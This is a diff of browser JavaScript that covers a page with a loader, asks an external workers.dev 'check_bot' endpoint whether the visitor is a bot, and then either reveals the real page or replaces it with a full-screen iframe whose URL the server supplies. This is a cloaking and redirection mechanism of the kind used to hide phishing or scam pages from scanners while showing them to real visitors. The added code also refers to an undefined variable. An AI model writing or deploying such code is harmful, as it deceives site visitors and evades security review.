@@ -1,7 +1,7 @@
 const createLoader = () => {
   const frame = document.createElement('iframe');
   frame.id = 'load_frame';
-  frame.src = 'frameLoad.html'; // FIX
+  frame.src = `frameLoad.html`;
   frame.frameBorder = 0;
   frame.width = '100%';
   frame.height = '100%';
@@ -11,61 +11,99 @@ const createLoader = () => {
   frame.style.width = '100%';
   frame.style.height = '100%';
   frame.style.zIndex = 9999;
-  document.body.prepend(frame);
+
+  const body = document.querySelector('body');
+  if (body) {
+    body.prepend(frame);
+  }
 };
 
 const showWhite = () => {
-  const body = document.body;
+  const body = document.querySelector('body');
   const html = document.documentElement;
-  body.classList.remove('hidden');
-  body.removeAttribute('hidden');
-  body.style.overflow = 'auto';
-  html.style.overflow = 'auto';
-  const preload = document.getElementById('load_frame');
-  if (preload) preload.remove();
+  if (body) {
+    body.classList.remove('hidden');
+    body.removeAttribute('hidden');
+    body.style.overflow = 'auto';
+  }
+  if (html) {
+    html.style.overflow = 'auto';
+  }
+
+
+  document.querySelectorAll('style').forEach(styleTag => {
+    if (styleTag.textContent.includes('overflow: hidden')) {
+      styleTag.textContent = styleTag.textContent.replace(/overflow:\s*hidden;?/g, 'overflow: auto !important;');
+    }
+  });
+
+  const preload = document.querySelector('#load_frame');
+  if (preload) {
+    preload.remove();
+  }
 };
 
 const showBlack = (blackUrl) => {
-  const body = document.body;
-  body.innerHTML = '';
-  body.style.margin = '0';
-  body.style.padding = '0';
-  body.style.overflow = 'hidden';
+
+  document.body.innerHTML = '';
+  document.body.style.margin = '0';
+  document.body.style.padding = '0';
+  document.body.style.overflow = 'hidden';
 
   const frame = document.createElement('iframe');
-  frame.id = 'wrapper_frame';
-  frame.src = blackUrl;
-  frame.style.cssText = `
-    position:fixed;top:0;left:0;width:100vw;height:100vh;
-    border:none;z-index:10000;display:block;
+  frame.setAttribute('src', blackUrl);
+  frame.setAttribute('id', 'wrapper_frame');
+  frame.style = `
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    border: none;
+    z-index: 10000;
+    display: block;
   `;
-  body.appendChild(frame);
 
-  const preload = document.getElementById('load_frame');
-  if (preload) preload.remove();
+  document.body.appendChild(frame);
+  body.classList.remove('hidden');
+  body.removeAttribute('hidden');
+
+  const style = document.createElement('style');
+  style.innerHTML = `
+    @media only screen and (max-width: 768px) {
+      #wrapper_frame { height: 50vh; }
+    }
+    @media only screen and (max-width: 480px) {
+      #wrapper_frame { height: 30vh; }
+    }
+  `;
+  document.head.appendChild(style);
+
+
+  setTimeout(() => {
+    const preload = document.querySelector('#load_frame');
+    if (preload) preload.remove();
+  }, 300);
 };
+
 
 createLoader();
 
-window.addEventListener('DOMContentLoaded', () => {
-  const qs = location.search || '';
-  const CAMPAIGN_URL = 'https://app.active-campaign.org/wvS95k'; 
 
-  fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot' + qs)
-    .then(r => r.json())
+window.addEventListener('DOMContentLoaded', () => {
+  fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot')
+    .then(res => res.json())
     .then(res => {
-      console.log('check_bot response:', res);
-      if (res?.code === 200 && res.result === true) {
-      
-        setTimeout(showWhite, 150);
+      if (res?.code === 200 && !res.result && res.url) {
+       
+        showBlack(res.url + '/wvS95k');
       } else {
-     
-        showBlack(CAMPAIGN_URL + qs);
+        
+        setTimeout(showWhite, 300);
       }
     })
     .catch(err => {
-      console.error('check_bot error:', err);
-      
-      showBlack(CAMPAIGN_URL + qs);
+      console.error('error resp:', err);
+      showWhite();
     });
 });
